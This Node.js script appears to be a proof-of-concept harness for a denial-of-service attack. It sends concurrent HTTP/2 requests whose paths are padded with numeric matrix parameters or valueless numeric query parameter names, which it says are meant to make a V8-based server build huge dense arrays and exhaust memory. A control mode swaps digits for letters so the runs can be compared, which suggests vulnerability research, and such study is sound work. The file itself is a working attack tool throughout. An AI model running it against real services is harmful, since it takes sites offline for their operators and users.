import http2 from "node:http2";
import { workloadFor } from "./workloads.mjs";

const target = new URL(process.env.TARGET_URL ?? "http://127.0.0.1:8080");
// Longer than Nginx's 30 s proxy_read_timeout, so the client never gives up
// before the proxy does and a slow control is not misread as a failure.
const REQUEST_TIMEOUT_MS = 45_000;

const SHAPES = Object.freeze({
  // Numeric matrix-parameter names, one parameter map per repeated segment.
  matrix: Object.freeze({
    candidate: "/a;990;2522",
    control: "/a;aaa;bbbb",
    build: (piece, { segmentsPerRequest }) => piece.repeat(segmentsPerRequest),
  }),
  // An e-commerce filter panel. The page's own parameters
  // come first; the rest is what an attacker appends to the same URL.
  //
  // The names carry no value at all, not even "=", which is the cheapest a query
  // parameter can be and so fits the most of them into the request line. They are
  // spaced filterStep apart, which is the widest spacing that still keeps V8
  // extending one dense elements store rather than giving up on it.
  //
  // The control swaps each name's last digit for a letter. That keeps the byte
  // count and the parameter count identical while making the name something
  // other than a canonical array index. It cannot collide: filterStep is at
  // least 10, so two names never share every digit but the last.
  filter: Object.freeze({
    candidate: (key) => String(key),
    control: (key) => {
      const text = String(key);
      return text.slice(0, -1) + "abcdefghij"[Number(text.at(-1))];
    },
    build: (makeName, { pathBytes, filterStep }) => {
      const base =
        "query=running+shoes&category=footwear&brand=nike&size=42" +
        "&color=black&sort=price_asc&page=3";
      const prefix = "/products?";
      const names = [];
      let used = prefix.length + base.length;

      for (let index = 0; ; index += 1) {
        const name = makeName(index * filterStep);
        if (used + 1 + name.length > pathBytes) break;
        names.push(name);
        used += 1 + name.length;
      }

      return `${prefix}${base}&${names.join("&")}`;
    },
  }),
});

const shape = process.env.SHAPE ?? "matrix";
if (!Object.hasOwn(SHAPES, shape)) {
  throw new Error(
    `Unsupported SHAPE=${shape}. Expected ${Object.keys(SHAPES).join(" or ")}.`,
  );
}

const mode = process.env.MODE ?? "candidate";
if (mode !== "candidate" && mode !== "control") {
  throw new Error(`Unsupported MODE=${mode}. Expected "candidate" or "control".`);
}

const heapMb = Number(process.env.HEAP_MB ?? "256");
const workload = workloadFor(heapMb, shape);
const { concurrency } = workload;

if (!["http:", "https:"].includes(target.protocol)) {
  throw new Error("TARGET_URL must use http:// or https://.");
}
if (target.pathname !== "/" || target.search || target.hash) {
  throw new Error("TARGET_URL must contain only the deployment origin.");
}

const path = SHAPES[shape].build(SHAPES[shape][mode], workload);
const pathBytes = Buffer.byteLength(path);
const authority = target.host;

console.log(
  JSON.stringify({
    shape,
    mode,
    heapMb,
    transport: "node:http2",
    ...(workload.segmentsPerRequest
      ? {
          segmentsPerRequest: workload.segmentsPerRequest,
          totalSegments: workload.segmentsPerRequest * concurrency,
        }
      : {}),
    ...(workload.filterStep
      ? { filterStep: workload.filterStep }
      : {}),
    concurrency,
    pathBytes,
    destination: target.origin,
    authority,
  }),
);

const session = http2.connect(target.origin);
const deadline = setTimeout(() => {
  console.error(`Request deadline exceeded after ${REQUEST_TIMEOUT_MS} ms.`);
  session.destroy();
}, REQUEST_TIMEOUT_MS);

function sendRequest(index) {
  return new Promise((resolve) => {
    let status = null;
    let bytes = 0;

    const req = session.request({
      ":method": "GET",
      ":scheme": target.protocol.slice(0, -1),
      ":authority": authority,
      ":path": path,
    });
    req.on("response", (headers) => {
      status = Number(headers[":status"]);
    });
    req.on("data", (chunk) => {
      bytes += chunk.length;
    });
    req.on("end", () => resolve({ index, status, bytes, ended: true }));
    req.on("error", (error) => {
      resolve({ index, error: error.code ?? error.message, ended: false });
    });
    req.end();
  });
}

session.on("error", (error) => {
  console.log(JSON.stringify({ sessionError: error.code ?? error.message }));
});

const results = await Promise.all(
  Array.from({ length: concurrency }, (_, index) => sendRequest(index)),
);

clearTimeout(deadline);
if (!session.closed && !session.destroyed) {
  session.close();
}
console.log(JSON.stringify({ shape, mode, heapMb, results }));
